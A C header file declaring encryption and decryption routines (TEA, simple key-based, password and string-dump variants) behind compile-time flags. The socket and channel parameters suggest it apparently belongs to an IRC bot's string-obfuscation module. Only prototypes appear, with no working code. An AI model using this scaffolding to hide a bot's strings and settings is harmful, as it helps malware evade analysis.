void Crypt(unsigned char *inp, DWORD inplen, unsigned char* key, DWORD keylen = 0);
#ifndef NO_CRYPT
void decryptstrings(void);
#endif

#ifdef DUMP_ENCRYPT
void encryptstring(char *str, char *varname, SOCKET sock, char *chan, bool notice);
void encryptstrings(int authsize, int versionsize, SOCKET sock, char *chan, bool notice);
#endif

#ifdef SIMPLE_CRYPT
char *decrypt(char *str,int key);
char *encrypt(char *str,int key);
#endif

#ifdef TEA_CRYPT
void code(long *data, long *key);
void decode(long *data, long *key);
void codestr(char *datastr, char *keystr);
void decodestr(char *datastr, char *keystr);
#endif

#ifdef PLAIN_CRYPT
char *EncryptPassword(char *password, char *key);
char *DecryptPassword(char *password, char *key);
#endif